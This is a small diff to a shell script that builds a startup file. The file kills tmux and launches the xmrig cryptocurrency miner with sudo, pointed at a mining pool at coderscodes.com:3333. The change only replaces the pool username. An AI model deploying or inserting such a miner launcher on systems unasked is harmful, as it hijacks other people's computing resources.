@@ -11,9 +11,9 @@ echo "#!/bin/sh">st.sh
 echo "cd $HOME/">>st.sh
 echo "tmux kill-server">>st.sh
 echo "sleep 1">>st.sh
-echo "tmux new-session -d -s main 'sudo ./xmrig -o coderscodes.com:3333 -u nullu -k -o coderscodes.com:3333 -u nullu -t nullt --donate-level=0 --randomx-1gb-pages'">>st.sh
+echo "tmux new-session -d -s main 'sudo ./xmrig -o coderscodes.com:3333 -u lino -k -o coderscodes.com:3333 -u lino -t nullt --donate-level=0 --randomx-1gb-pages'">>st.sh
 time=$(date +%s)
-user=$time.OR
+user=lino
 threads=$(nproc)
 sed "s/nullt/$threads/g" st.sh>star.sh
 sed "s/nullu/$user/g" star.sh>start.sh
